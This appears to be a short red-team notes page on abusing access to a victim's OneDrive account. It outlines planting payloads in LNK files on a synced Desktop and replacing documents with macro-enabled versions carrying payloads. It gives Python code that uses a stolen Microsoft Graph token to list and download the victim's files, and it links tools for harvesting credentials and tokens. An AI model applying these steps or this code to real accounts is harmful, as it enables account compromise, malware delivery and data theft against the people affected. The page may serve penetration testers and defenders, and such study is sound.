---
title: OneDrive
---

> Under construction 🚧

OneDrive access to code execution on a computer:

- login to victim account, check last edited office documents
- `~/Desktop` is often synced with OneDrive, e.g. embed payload in LNK file
- otherwise replace documents with macro-enabled format and embed payload

Download files from OneDrive with Python ([source](https://twitter.com/OutflankNL/status/1623665284744679424/)).

~~~ python
# pip3 install --user o365
from O365 import MSOffice365Protocol, MSGraphProtocol, EnvTokenBackend, Account
import os

os.environ['MSGRAPHTOKEN'] = '{"access_token":"eyJ0..."}'

credentials = ('id', 'secret')
msgraph = Account(credentials, token_backend=EnvTokenBackend('MSGRAPHTOKEN'), protocol=MSGraphProtocol())

# list files in OneDrive
drive = msgraph.storage().get_default_drive()
list(drive.get_items())

# download file
drive.get_item_by_path('/doucment.docx').download('downloads')
~~~

Search for credentials in OneDrive with [TeamFiltration](https://github.com/Flangvik/TeamFiltration).

Untested tools:

- [Token Farm](https://github.com/rootsecdev/Azure-Red-Team/tree/master/Tokens), python scripts to access Outlook emails and OneDrive
